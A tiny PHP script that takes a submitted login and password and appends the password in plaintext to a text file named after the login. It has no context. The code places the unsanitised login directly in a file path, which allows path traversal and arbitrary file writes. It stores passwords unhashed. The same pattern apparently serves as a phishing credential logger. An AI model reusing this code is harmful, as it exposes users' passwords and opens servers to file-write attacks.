
<?
$log = $_POST['login'];
$pas = $_POST['password'];


$f = fopen("users/$log.txt", 'a');
fwrite($f,"$pas");
fclose($f);
?>